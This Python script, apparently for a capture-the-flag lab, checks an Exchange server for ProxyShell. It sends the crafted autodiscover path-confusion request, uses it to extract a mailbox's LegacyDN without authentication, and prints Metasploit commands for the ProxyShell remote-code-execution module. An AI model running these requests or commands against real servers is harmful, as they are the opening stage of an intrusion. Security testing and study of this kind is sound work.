#!/usr/bin/env python3
"""
proxyshell_diagnostic.py

Safe diagnostic tool for Exchange ProxyShell *detection* and LegacyDN extraction.
DOES NOT perform exploit actions (no token forging, no MAPI binary POSTs,
no email/payload delivery, no web-shell writes).

Use only in authorized/controlled environments (HTB lab, your own test systems).
"""

import argparse
import requests
import xml.etree.ElementTree as ET
import re
import sys
import time

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

DEFAULT_TIMEOUT = 8.0

def check_proxyshell_on_exchange(base_url: str, timeout: float = DEFAULT_TIMEOUT) -> bool:
    """
    Non-destructive check for the ProxyShell Autodiscover redirect pattern.
    Returns True if the server returns a 302 for the crafted path (common sign).
    """
    print("[-] Checking for ProxyShell redirect behavior on Exchange Server (non-destructive)")
    # crafted path used by many PoCs to trigger the redirect behaviour
    test_path = "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com"
    url = base_url.rstrip('/') + test_path
    try:
        resp = requests.get(url, verify=False, allow_redirects=False, timeout=timeout)
    except requests.RequestException as e:
        print(f"[!] Request error: {e}")
        return False

    print(f"[*] HTTP {resp.status_code} returned for {url}")
    # Many PoCs detect a 302 redirect as the initial symptom; other servers may differ
    if resp.status_code == 302:
        print("[+] Exchange server returned 302 for crafted autodiscover path — indicative of the ProxyShell redirect behaviour.")
        return True
    else:
        print("[-] Did not observe 302 redirect. This does not prove the server is patched, but it's a negative for this specific check.")
        return False

def get_legacydn(base_url: str, email: str, timeout: float = DEFAULT_TIMEOUT) -> str:
    """
    Sends a standard Autodiscover XML request and returns the LegacyDN if present.
    Raises RuntimeError with diagnostics on failure.
    """
    print("[-] Requesting Autodiscover to obtain LegacyDN (read-only request)")
    body = (
        '<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">'
        '<Request>'
        f'<EMailAddress>{email}</EMailAddress>'
        '<AcceptableResponseSchema>'
        'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'
        '</AcceptableResponseSchema>'
        '</Request>'
        '</Autodiscover>'
    )

    autodiscover_path = "/autodiscover/autodiscover.json?@test.com/autodiscover/autodiscover.xml?&Email=autodiscover/autodiscover.json%3F@test.com"
    url = base_url.rstrip('/') + autodiscover_path
    try:
        resp = requests.post(url, headers={"Content-Type": "text/xml"}, data=body.encode("utf-8"),
                             verify=False, timeout=timeout)
    except requests.RequestException as e:
        raise RuntimeError(f"[Stage 1] Autodiscover request error: {e}") from e

    print(f"[*] Autodiscover returned HTTP {resp.status_code}")
    if resp.status_code != 200:
        snippet = (resp.text or "")[:600].replace("\n", " ")
        raise RuntimeError(f"[Stage 1] Unexpected status {resp.status_code}. Body snippet: {snippet}")

    # Try XML parsing first
    legacydn = None
    try:
        root = ET.fromstring(resp.content)
        # Namespace-agnostic search for LegacyDN
        for el in root.iter():
            if el.tag.endswith("LegacyDN") and el.text and el.text.strip():
                legacydn = el.text.strip()
                break
    except ET.ParseError:
        # parse error is not fatal — fall back to regex
        pass

    if not legacydn:
        # fallback: regex search in response body
        text = resp.content.decode("utf-8", errors="ignore")
        m = re.search(r"<LegacyDN>(.*?)</LegacyDN>", text, re.DOTALL | re.IGNORECASE)
        if m:
            legacydn = m.group(1).strip()

    if not legacydn:
        snippet = (resp.text or "")[:800].replace("\n", " ")
        raise RuntimeError(f"[Stage 1] LegacyDN not found in Autodiscover response. Body snippet:\n{snippet}")

    print(f"[+] LegacyDN found: {legacydn}")
    return legacydn

def main():
    parser = argparse.ArgumentParser(description="Safe ProxyShell diagnostic: check + LegacyDN extraction")
    parser.add_argument("-u", "--url", required=True, help="Base Exchange URL (e.g. https://10.129.2.39/)")
    parser.add_argument("-e", "--email", required=True, help="Email address to query (e.g. Administrator@domain.local)")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, help="HTTP timeout seconds (default 8)")
    args = parser.parse_args()

    base_url = args.url
    email = args.email

    # Step 0: quick reachability
    try:
        r = requests.get(base_url, verify=False, timeout=args.timeout)
        print(f"[*] Reachability test: {base_url} responded with HTTP {r.status_code}")
    except requests.RequestException as e:
        print(f"[!] Unable to reach {base_url}: {e}")
        sys.exit(1)

    # Step 1: check redirect behavior
    is_redirecting = check_proxyshell_on_exchange(base_url, timeout=args.timeout)

    # Step 2: attempt to get LegacyDN
    try:
        legacydn = get_legacydn(base_url, email, timeout=args.timeout)
    except RuntimeError as e:
        print(str(e))
        sys.exit(1)

    print("\nSummary:")
    print(f"  - Base URL: {base_url}")
    print(f"  - Email queried: {email}")
    print(f"  - Observed ProxyShell-style redirect (302)? {'Yes' if is_redirecting else 'No'}")
    print(f"  - LegacyDN: {legacydn}")

    print("\nNext steps (safe & recommended):")
    print("  - If you are authorized to test further, use the official Metasploit module interactively:")
    print("      msfconsole")
    print("      use exploit/windows/http/exchange_proxyshell_rce")
    print("      set RHOSTS <target>")
    print("      set LHOST <your tun0 IP>")
    print("      check")
    print("  - If this is for defensive work, collect packet captures (tcpdump) and IIS logs for the requests above to craft IDS rules.")
    print("  - Do NOT run payload delivery or MAPI binary posts unless you have explicit permission and isolate in a lab VM.")

if __name__ == '__main__':
    main()

